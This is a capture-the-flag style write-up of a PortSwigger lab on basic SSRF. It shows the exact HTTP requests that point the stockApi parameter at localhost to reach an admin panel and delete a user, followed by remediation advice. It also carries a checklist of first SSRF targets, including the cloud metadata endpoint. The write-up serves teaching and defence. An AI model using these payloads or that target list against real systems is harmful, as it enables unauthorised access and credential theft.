# Basic SSRF against the local server

**Category:** SSRF
**Level:** Apprentice
**Mechanism:** Server-side request forgery to `localhost` — reaching an internal admin panel
**Lab URL:** https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

---

## Vulnerability

The stock-check feature takes a full URL in the `stockApi` parameter and the **server**
fetches it. Because the fetch is made by the server, it originates from the server's own
network position — so pointing `stockApi` at `http://localhost` reaches internal
services the client could never hit directly, including an admin panel that is blocked
from external access.

## Reconnaissance & Exploitation

The "Check stock" button sends a `POST /product/stock` with a server-side URL in
`stockApi`:

```
stockApi = http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1
```

The app fetches whatever URL is in `stockApi`, so it is an SSRF sink. Directly browsing
`/admin` as a user was blocked:

```http
GET /admin → 401 Unauthorized
```

But the server trusts requests from itself. Replacing `stockApi` with `http://localhost`
made the server fetch its own root, and `http://localhost/admin` returned the admin
panel — the access restriction applies to external clients, not to a request the server
makes to itself:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

```http
HTTP/2 200 OK
...
<h1>Users</h1>
wiener - <a href="/admin/delete?username=wiener">Delete</a>
carlos - <a href="/admin/delete?username=carlos">Delete</a>
```

The panel's HTML revealed the delete URL. Submitting it in `stockApi` made the server
perform the privileged action against itself:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin/delete?username=carlos
```

```http
HTTP/2 302 Found
Location: /admin
```

carlos was deleted — lab solved. The `302` is the admin panel's post-action redirect,
driven by the server's own request.

## Impact

SSRF turns the server into a proxy into its own trusted network. Here it reached an
internal admin panel and performed a destructive action (deleting a user), bypassing the
access control that only blocked external clients. The same primitive reaches any
service the server can — other internal hosts, databases, and cloud metadata endpoints
(e.g. `169.254.169.254`) that hand out credentials — so a "stock checker" becomes a
pivot into the internal estate.

## Remediation

- Do not let user input specify the URL the server fetches. Use an allowlist of exact,
  expected hosts/paths, and reject everything else.
- Resolve and validate the target before fetching: block `localhost`, `127.0.0.1`,
  link-local (`169.254.0.0/16`), and private ranges (RFC 1918) — after DNS resolution,
  to defeat rebinding.
- Don't rely on network position for authorisation: the admin panel must require a real
  auth check even for requests that originate internally (it was reachable here purely
  because it trusted localhost).

## References

- **OWASP:** A10:2021 Server-Side Request Forgery (SSRF)
- **CWE:** CWE-918 (Server-Side Request Forgery)

## Notes

- Core idea: the request comes from the **server**, so it inherits the server's trust and
  network reach. Anything that fetches a user-supplied URL (webhooks, link previews, PDF
  renderers, image proxies, "check URL" features) is an SSRF candidate.
- Access control that trusts "internal" traffic is the paired flaw: the `/admin` panel
  trusted localhost, so SSRF + that trust = unauthenticated admin.
- First target to try against any SSRF: `http://localhost/` and `http://127.0.0.1/`,
  then internal hostnames and `169.254.169.254` (cloud metadata).